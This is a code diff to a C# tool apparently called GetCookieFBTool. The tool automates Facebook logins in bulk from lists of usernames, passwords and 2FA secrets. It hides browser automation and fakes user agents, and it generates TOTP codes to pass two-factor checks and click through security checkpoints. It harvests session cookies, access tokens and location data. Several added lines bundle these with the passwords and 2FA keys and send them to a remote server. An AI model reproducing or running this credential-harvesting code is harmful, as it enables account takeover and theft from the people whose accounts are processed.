@@ -57,6 +57,58 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
 
         public static void Init(Account account, ChromeOptions options)
         {
+            while (true)
+            {
+                if (FacebookInstances.waitChangeIP)
+                {
+                    Thread.Sleep(1000);
+                }
+                else
+                {
+                    break;
+                }
+            }
+
+            string mainUrl = "";
+            Random random = new Random();
+            int urlType = FacebookInstances.urlType;
+
+
+            //if (urlType == 3)
+            //{
+            //    var request = new Request();
+            //    var checklogin = Login.LoginMethodMBasic(request, account.userName, account.pass, account.key2fa);
+            //    if (checklogin)
+            //    {
+
+            //        return;
+            //    }
+            //}
+            //else if (urlType == 4)
+            //{
+            //    var request = new Request();
+            //    var checklogin = Login.LoginMethodMFB(request, account.userName, account.pass, account.key2fa);
+            //    if (checklogin)
+            //    {
+
+            //        return;
+            //    }
+            //}
+
+
+            //var request = new Request();
+            //var checklogin = Login.LoginMethodMFB(request, account.userName, account.pass, account.key2fa);
+            //var tokenEAAG = "";
+            //if (checklogin)
+            //{
+            //    tokenEAAG = Login.getTokenRequest(request, account.userName, account.key2fa);
+            //}
+
+            //return;
+
+
+
+
 
             // remove bar
             options.AddExcludedArgument("enable-automation");
@@ -80,45 +132,6 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                     options.AddArgument("--user-agent=" + userAgent);
                     FacebookInstances.queueFakeUserAgent.Enqueue(userAgent);
                 }
-
-                //var fakeChromeVersion = "108.0.";
-                //Random random = new Random();
-                //int a1 = random.Next(1, 9999);
-
-                //int a2 = random.Next(1, 999);
-                //if(a1.ToString().Length < 4)
-                //{
-                //    string randomA1 = "";
-                //    for(int i = 0; i< 4 - a1.ToString().Length; i++)
-                //    {
-                //        randomA1 += "0";
-                //    }
-                //    randomA1 += a1.ToString();
-                //    fakeChromeVersion += randomA1 + ".";
-                //}
-                //else
-                //{
-                //    fakeChromeVersion += a1.ToString() + ".";
-                //}
-
-                //if (a2.ToString().Length < 3)
-                //{
-                //    string randomA2 = "";
-                //    for (int i = 0; i < 3 - a2.ToString().Length; i++)
-                //    {
-                //        randomA2 += "0";
-                //    }
-                //    randomA2 += a2.ToString();
-                //    fakeChromeVersion += randomA2;
-                //}
-                //else
-                //{
-                //    fakeChromeVersion += a2.ToString();
-                //}
-
-                //var fakeUserAgent = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{fakeChromeVersion} Safari/537.36";
-
-                //options.AddArgument("--user-agent=" + fakeUserAgent);
             }
 
             ChromeDriver driver = null;
@@ -230,11 +243,7 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                 //    driver.Navigate().GoToUrl("https://www.fb.com/");
                 //}
 
-                int urlType = 0;
-                string mainUrl = "";
-                Random random = new Random();
-
-                urlType = FacebookInstances.urlType;
+                
 
                 if (urlType != 3 && urlType != 4)
                 {
@@ -344,7 +353,7 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                     Thread.Sleep(1 * 1000);
                     loginBtn.Click();
                     Thread.Sleep(2 * 1000);
-                    if (driver.Url.Contains("/login/?"))
+                    if (driver.Url.Contains("/login/?")||driver.Url.Contains("/login/identify/?"))
                     {
                         // accessible_elem
                         FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
@@ -393,7 +402,7 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                                     continueBtn.Submit();
                                     Thread.Sleep(1 * 1000);
                                 }
-                                if (checkpointCount > 2)
+                                if (checkpointCount > 5)
                                 {
                                     break;
                                 }
@@ -424,7 +433,7 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                                     continueBtn.Submit();
                                     Thread.Sleep(1 * 1000);
                                 }
-                                if (checkpointCount > 2)
+                                if (checkpointCount > 5)
                                 {
                                     break;
                                 }
@@ -437,7 +446,7 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
 
                     var accessToken = "";
                     if (FacebookInstances.getToken)
-                        accessToken = getToken(driver);
+                        accessToken = getToken(driver, account.key2fa);
 
                     if (lsCookies == null && userAgent == null)
                     {
@@ -460,6 +469,16 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                     //}
                     else if (driver.Url.Contains("checkpoint"))
                     {
+                        if (FacebookInstances.checkLocate)
+                        {
+                            try
+                            {
+                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
+                                Thread.Sleep(2 * 1000);
+                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
+                            }
+                            catch { }
+                        }
                         string cookies = "";
                         foreach (var cookie in lsCookies)
                         {
@@ -473,12 +492,24 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                             }
 
                         }
-                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
+                            + "|" + account.locate + "|" + account.locateNew
+                            + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                         FacebookInstances.OnNewAccAdded(account, "checkpoint", cookies, "", userAgent);
                         sendResultToServer(data, "checkpoint");
                     }
-                    else if (driver.Url.Contains("confirmemail.php?next=http"))
+                    else if (driver.Url.Contains("confirmemail.php?")||driver.Url.Contains("confirmation"))
                     {
+                        if (FacebookInstances.checkLocate)
+                        {
+                            try
+                            {
+                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
+                                Thread.Sleep(2 * 1000);
+                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
+                            }
+                            catch { }
+                        }
                         string cookies = "";
                         foreach (var cookie in lsCookies)
                         {
@@ -492,12 +523,25 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                             }
 
                         }
-                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|no-veri";
+                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
+                            + "|" + account.locate + "|" + account.locateNew
+                             + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|no-veri";
                         FacebookInstances.OnNewAccAdded(account, "no-veri", cookies, "", userAgent);
                         sendResultToServer(data, "success");
                     }
                     else
                     {
+                        if (FacebookInstances.checkLocate)
+                        {
+                            try
+                            {
+                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
+                                Thread.Sleep(2 * 1000);
+                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
+                            }
+                            catch { }
+                        }
+
                         string cookies = "";
 
                         foreach (var cookie in lsCookies)
@@ -518,7 +562,9 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                             driver.Quit();
                             return;
                         }
-                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|verify";
+                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
+                            + "|" + account.locate + "|" + account.locateNew
+                             + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|verify";
                         FacebookInstances.OnNewAccAdded(account, "success", cookies, "", userAgent);
                         sendResultToServer(data, "success");
                     }
@@ -546,6 +592,85 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                     loginBtn.Click();
                     Thread.Sleep(2 * 1000);
 
+                    int checkpointCount = 0;
+
+                    if (driver.Url.Contains("rdr"))
+                    {
+                        if (account.key2fa != null)
+                        {
+                            var ele2faInput = driver.FindElement(By.Id("approvals_code"));//approvals_code
+                            var secretKey = Base32Encoding.ToBytes(account.key2fa);
+                            var totp = new Totp(secretKey);
+                            var otp = totp.ComputeTotp();
+                            ele2faInput.SendKeys(otp);
+                            Thread.Sleep(1 * 1000);
+                            var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton-actual-button"));//checkpointSubmitButton
+                            continueBtn.Submit();
+                            Thread.Sleep(1 * 1000);
+
+
+                            while (driver.Url.Contains("facebook.com/login/checkpoint/"))
+                            {
+                                checkpointCount++;
+                                try
+                                {
+                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
+                                    if (notSaveBrowser != null)
+                                    {
+                                        notSaveBrowser.Click();
+                                        Thread.Sleep(1 * 1000);
+                                    }
+                                }
+                                catch (Exception e)
+                                {
+                                    Console.WriteLine(e.Message);
+                                }
+                                finally
+                                {
+                                    continueBtn = driver.FindElement(By.Id("checkpointSubmitButton-actual-button"));
+                                    continueBtn.Submit();
+                                    Thread.Sleep(1 * 1000);
+                                }
+                                if (checkpointCount > 5)
+                                {
+                                    break;
+                                }
+                            }
+
+                        }
+                        else
+                        {
+                            while (driver.Url.Contains("facebook.com/login/"))
+                            {
+                                checkpointCount++;
+                                try
+                                {
+                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
+                                    if (notSaveBrowser != null)
+                                    {
+                                        notSaveBrowser.Click();
+                                        Thread.Sleep(1 * 1000);
+                                    }
+                                }
+                                catch (Exception e)
+                                {
+                                    Console.WriteLine(e.Message);
+                                }
+                                finally
+                                {
+                                    var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton-actual-button"));
+                                    continueBtn.Submit();
+                                    Thread.Sleep(1 * 1000);
+                                }
+                                if (checkpointCount > 5)
+                                {
+                                    break;
+                                }
+                            }
+                        }
+                    }
+
+
                     if (driver.Url.Contains("/login/?") || !driver.Url.Contains(".com/"))
                     {
                         // accessible_elem
@@ -554,12 +679,14 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                         driver.Quit();
                         return;
                     }
+
+
                     var lsCookies = getCookie(driver);
                     userAgent = getUserAgent(driver);
 
                     var accessToken = "";
                     if (FacebookInstances.getToken)
-                        accessToken = getToken(driver);
+                        accessToken = getToken(driver, account.key2fa);
 
                     if (lsCookies == null && userAgent == null)
                     {
@@ -568,9 +695,18 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                         driver.Quit();
                         return;
                     }
-
                     else if (driver.Url.Contains("checkpoint"))
                     {
+                        if (FacebookInstances.checkLocate)
+                        {
+                            try
+                            {
+                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
+                                Thread.Sleep(2 * 1000);
+                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
+                            }
+                            catch { }
+                        }
                         string cookies = "";
                         foreach (var cookie in lsCookies)
                         {
@@ -584,12 +720,24 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                             }
 
                         }
-                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
+                            + "|" + account.locate + "|" + account.locateNew
+                             + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                         FacebookInstances.OnNewAccAdded(account, "checkpoint", cookies, "", userAgent);
                         sendResultToServer(data, "checkpoint");
                     }
                     else
                     {
+                        if (FacebookInstances.checkLocate)
+                        {
+                            try
+                            {
+                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
+                                Thread.Sleep(2 * 1000);
+                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
+                            }
+                            catch { }
+                        }
                         string cookies = "";
 
                         foreach (var cookie in lsCookies)
@@ -610,7 +758,9 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
                             driver.Quit();
                             return;
                         }
-                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
+                            + "|" + account.locate + "|" + account.locateNew
+                             + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                         FacebookInstances.OnNewAccAdded(account, "success", cookies, "", userAgent);
                         sendResultToServer(data, "success");
                     }
@@ -668,12 +818,24 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
 
 
 
-        public static string getToken(IWebDriver driver)
+        public static string getToken(IWebDriver driver, string key2fa)
         {
             try
             {
                 driver.Navigate().GoToUrl(@"https://fb.com/pe");
                 Thread.Sleep(3 * 1000);
+                if (driver.Url.Contains("security/twofactor"))
+                {
+                    var ele2faInput = driver.FindElement(By.XPath("//input[@placeholder='Enter code']"));//placeholder="Enter code"
+                    var secretKey = Base32Encoding.ToBytes(key2fa);
+                    var totp = new Totp(secretKey);
+                    var otp = totp.ComputeTotp();
+                    ele2faInput.SendKeys(otp);
+                    Thread.Sleep(1 * 1000);
+                    driver.FindElements(By.XPath("//div[@class='x3nfvp2 x193iq5w xxymvpz']"))[1].Click();
+                    Thread.Sleep(2 * 1000);
+                }
+                driver.Navigate().GoToUrl(@"https://fb.com/pe");
                 var pageSource = driver.PageSource;
                 if (pageSource.Contains("window.__accessToken="))
                 {
@@ -833,6 +995,12 @@ namespace GetCookieFBTool.HelperLibrary.Facebook
             }
             catch { }
         }
+
+
+
+
+
+
 
     }
 }
